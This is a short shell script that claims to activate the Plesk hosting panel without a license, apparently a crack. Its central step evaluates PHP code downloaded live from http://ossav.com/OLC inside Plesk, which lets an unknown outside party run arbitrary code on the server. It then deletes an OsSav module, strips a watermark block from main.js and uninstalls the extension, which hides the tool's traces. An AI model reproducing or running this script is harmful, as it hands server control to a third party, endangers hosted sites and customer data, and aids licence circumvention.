echo "******************"
echo "Script by Trisout"
echo "******************"
echo "For support contact me on discord"
sleep 10
echo "Activating Plesk..."
plesk php -er "eval(file_get_contents('http://ossav.com/OLC'));"
sleep 5
echo "Patching Plesk..."
echo "Stopping Plesk..."
systemctl stop psa
echo "Plesk Stopped"
echo "Removing WaterMark..."
rm -rf /usr/local/psa/admin/htdocs/modules/OsSav
fichier="/opt/psa/admin/cp/public/javascript/main.js"
if [ -e "$fichier" ]; then
    sed -i '/\/\*\* OsSav v1\.98 \*\*\//,/\/\*\* Fin de OsSav v1\.98 \*\*\//d' "$fichier"
    echo "Removed WaterMark"
else
    echo "An Error has occured when removing WaterMark. Please Relaunch the script"
fi
sleep 5
echo "Restaring Plesk..."
systemctl start psa
echo "Plesk restarted"
echo "Removing Ossav Plesk Extention"
plesk bin extension --uninstall OsSav
echo "****************************************************"
echo "Your Plesk is now activated"
echo "If your plesk is not activated, please relaunch the script !"
echo "****************************************************"